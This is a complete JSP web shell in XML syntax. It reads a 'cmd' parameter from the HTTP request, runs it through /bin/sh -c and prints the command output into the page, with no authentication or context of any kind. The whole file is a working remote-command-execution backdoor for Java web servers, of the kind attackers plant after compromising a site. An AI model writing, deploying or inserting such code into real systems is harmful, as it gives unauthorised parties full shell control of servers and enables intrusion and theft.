<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>
<jsp:scriptlet><![CDATA[
	String cmd = pageContext.getRequest().getParameter("cmd");
	if (cmd != null&&!"".equals(cmd)) {
	try{
		final Process p = new ProcessBuilder("/bin/sh", "-c", cmd).start();
		final int retval = p.waitFor();
		InputStream in = p.getInputStream();
		BufferedReader br = new BufferedReader(new InputStreamReader(in,"GBK"));
		String brs = br.readLine();
		while(brs!=null){
			out.println(brs+"</br>");
			brs = br.readLine();
		}
		}catch(Exception ex){
			out.println(ex.toString());
		}
	}]]>
</jsp:scriptlet>
</jsp:root>
